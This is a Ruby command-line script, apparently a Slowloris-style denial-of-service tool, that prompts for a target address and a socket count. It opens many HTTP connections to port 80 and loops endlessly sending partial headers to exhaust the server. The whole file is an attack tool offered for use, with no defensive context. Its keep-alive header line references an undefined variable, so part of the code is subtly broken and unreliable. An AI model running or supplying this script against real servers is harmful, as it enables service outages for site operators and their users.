require "socket"

def attack(target, socket_count)
  prng = Random.new(1234)
  sockets = []
  regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:36.0) Gecko/20100101 Firefox/36.0.4 Waterfox/36.0.4",
    "Accept-language: en-US,en,q=0.5"
  ]

  socket_count.times do |i|
    begin
      socket = Socket.new(:INET, :STREAM)
      socket_address = Socket.pack_sockaddr_in(80, target)
      socket.connect(socket_address)

      socket.write(("GET /?%{n} HTTP/1.1\r\n" % { n: prng.rand(2000) }).encode("utf-8"))

      regular_headers.each do |h|
        socket.write("#{h}\r\n".encode("utf-8"))
      end

      sockets << socket
    rescue
      break
    end
  end

  while true
    puts("<!> Sended")
    sockets.each do |s|
      begin
        s.write(("X-a: #{n}\r\n" % { n: prng.rand(4999)+1 }).encode("utf-8"))
      rescue
        sockets.delete(s)
      end            
    end

    (socket_count - sockets.size).times do
      puts("<§> Creating Socket ...")
      begin
        socket = Socket.new(:INET, :STREAM)
        socket_address = Socket.pack_sockaddr_in(80, target)
        socket.connect(socket_address)
        sockets << socket if socket
      rescue
        break
      end      
    end
  end
end

system("clear || cls")
print '
    <§> Type your target address:

    ┌─[Blade~ #Home/Clash]
    └╼ <†> '
target = gets.chomp
print '
    <§> Type Socket number:

    ┌─[Blade~ #Home/Clash]
    └╼ <†> '
socket_count = gets.to_i
attack(target, socket_count)